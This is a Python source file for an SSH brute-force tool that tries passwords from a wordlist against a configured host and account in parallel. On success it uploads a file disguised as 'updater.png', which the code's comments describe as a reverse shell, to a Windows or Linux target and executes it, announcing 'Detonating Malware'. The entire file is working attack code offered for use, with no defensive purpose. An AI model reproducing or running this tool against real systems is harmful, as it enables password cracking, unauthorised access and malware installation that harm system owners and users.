import paramiko
import multiprocessing
import sys,socket
from colorama import Fore
from tqdm import tqdm
from ssh import check_ssh

print(Fore.RED + """
╦  ╦╦╔═╗╔═╗╦═╗
╚╗╔╝║╠═╝║╣ ╠╦╝
 ╚╝ ╩╩  ╚═╝╩╚═ """ + Fore.WHITE + "Parallel SSH Bruteforcer V1.2 Developed by" + " \033[38;5;208mThe Intrusion Team\033[0m" + Fore.RESET)
 
 
 # Orange colour
orange = "\033[38;5;208m[*]\033[0m "
 
# Configuration
host = '10.1.1.41'  # SSH host
port = 22  # SSH port
username = 'IEUser'  # SSH username
password_file = 'passwords.txt'  # File containing passwords
num_processes = 5  # Number of processes max limit is 5

# Windows Config
malware = "updater.png" # Windows reverse shell filename
remote_directory = "C:\\ProgramData\\Updates" # Create directory on target 
windows_local_path = "Files/" + malware  # File to upload on windows server
windows_remote_path = "C:\\ProgramData\\Updates\\" + malware # Path to write file to on target server

# Linux Config
linux_local_path = "Files/" + malware # File to upload Linux server
linux_remote_path = "/tmp/" + malware # Path to write file to on target server

check_ssh(host,port)

print(Fore.WHITE + "[" + Fore.RED + "Target" + Fore.WHITE + "] " + Fore.WHITE + host + Fore.RESET)
print(Fore.WHITE + "[" + Fore.RED + "Bruteforcing Account" + Fore.WHITE + "] " + Fore.WHITE + username + Fore.RESET)
print(Fore.WHITE + "[" + Fore.RED + "Threads Running" + Fore.WHITE + "] ", Fore.WHITE, num_processes, Fore.RESET)

password_found = multiprocessing.Value('i', 0)  # Global variable to track if password is found

def ssh_login(credentials):
    hostname, port, username, password = credentials

    # Create an SSH client
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Attempt to connect to the SSH server
        client.connect(hostname, port, username, password, allow_agent=False,look_for_keys=False,timeout=5)

        # Authentication succeeded
        print(Fore.WHITE + "[" + Fore.RED + "Password Cracked" + Fore.WHITE + "] " + Fore.WHITE + password + Fore.RESET)
        password_found.value = 2
        
        # Exploitation Execute commands on server
        stdin, stdout, stderr = client.exec_command("cmd.exe /c 'systeminfo' | systeminfo")
        if 'Windows' in stdout.read().decode():
            print(Fore.WHITE + "\n[" + Fore.RED + "Exploitation" + Fore.WHITE + "]" + Fore.RESET)
            print(Fore.RED + "    └──=> " + Fore.WHITE + "Windows System Detected" + Fore.RESET)
            

            try:
	            sftp = client.open_sftp()
	            print(Fore.RED + "    └──=> " + orange + Fore.WHITE + "Creating Updates Directory" + Fore.RESET)
	            sftp.mkdir(remote_directory)
	            print(Fore.RED + "    └──=> " + orange + Fore.WHITE + f"Uploading {malware} to: {windows_remote_path}" + Fore.RESET)
	            sftp.put(windows_local_path, windows_remote_path)
	            sftp.close()
	            print(Fore.RED + "    └──=> " + orange + Fore.WHITE + "Upload Successful: " + windows_remote_path +  Fore.RESET)
	            print(Fore.RED + "    └──=> " + orange + Fore.WHITE + "Detonating Malware: " + malware + Fore.RESET)
	            client.exec_command(windows_remote_path)
	            print(Fore.RED + "    └──=> " + orange + Fore.WHITE + "Happy Hacking" + Fore.RESET)
	            password_found.value = 1
            except Exception as fd:
	            print(Fore.RED + "    └──=> " + "[!] " + Fore.WHITE + f"{str(fd)}" + Fore.RESET)
	            password_found.value = 1
	                
        else:
            print(Fore.WHITE + "\n[" + Fore.RED + "Exploitation" + Fore.WHITE + "]" + Fore.RESET)
            print(Fore.RED + "    └──=> " + Fore.WHITE + "Linux System Detected" + Fore.RESET)
            
           
            try:
	            sftp = client.open_sftp()
	            print(Fore.RED + "    └──=> " + orange + Fore.WHITE + "Uploading Malware to: /tmp folder" + Fore.RESET)
	            sftp.put(linux_local_path, linux_remote_path)
	            sftp.close()
	            print(Fore.RED + "    └──=> " + orange + Fore.WHITE + "Upload Successful: " + linux_remote_path + Fore.RESET)
	            client.exec_command("cd /tmp/ && chmod +x " + malware + " && ./" + malware)
	            print(Fore.RED + "    └──=> " + orange + Fore.WHITE + "Detonating Malware: " + malware + Fore.RESET)
	            print(Fore.RED + "    └──=> " + orange + Fore.WHITE + "Happy Hacking" + Fore.RESET)
	            password_found.value = 1
            except Exception as fd:
	            print(Fore.RED + "    └──=> " + "[!] " + Fore.WHITE + f"Download Failed: {fd}" + Fore.RESET)
	            password_found.value = 1
            
            
    except socket.error:
        print(Fore.WHITE + "[" + Fore.RED + "Connection Error" + Fore.WHITE + "] " + Fore.WHITE + "Account Locked" )
        password_found.value = 1
    except paramiko.AuthenticationException:
        # Authentication failed
        pass
    except Exception as e:
        # Connection error
        password_found.value = 1
        print(Fore.WHITE + "[" + Fore.RED + "Error" + Fore.WHITE + "] " + Fore.WHITE + f"{str(e)}" + Fore.RESET)

    # Close the SSH client
    client.close()

def read_passwords_from_file(filename):
    passwords = []
    with open(filename, 'r') as file:
        lines = file.readlines()
        print(Fore.WHITE + "[" + Fore.RED + "SSH Login Attempts" + Fore.WHITE + "]", Fore.WHITE, len(lines), Fore.RESET)
        for line in lines:
            password = line.strip()
            if password:
                passwords.append(password)
    return passwords

def generate_credentials_with_passwords(host, port, username, passwords):
    credentials = []
    for password in passwords:
        credentials.append((host, port, username, password))
    return credentials

def multi_process_ssh_login(credentials, num_processes):
    # Create a process pool
    pool = multiprocessing.Pool(processes=num_processes)

    # Apply the SSH login function to each set of credentials in parallel
    with tqdm(total=len(credentials), desc='[Bruteforcing]', colour="white", unit='passwords') as pbar:
        results = []
        for _ in pool.imap_unordered(ssh_login, credentials):
            pbar.update()
            results.append(_)
            if password_found.value == 1:
                pool.terminate()  # Terminate all workers
                pool.join()
                sys.exit()  # Quit the program
                
            if password_found.value == 2:
                pbar.close()

    # Close the process pool
    pool.close()
    pool.join()

    # Print any results from the results list
    for result in results:
        if result is not None:
            print(result)

# Read passwords from file
passwords = read_passwords_from_file(password_file)

# Generate credentials with passwords
credentials_with_passwords = generate_credentials_with_passwords(host, port, username, passwords)

# Run the multi-processor SSH login
multi_process_ssh_login(credentials_with_passwords, num_processes)

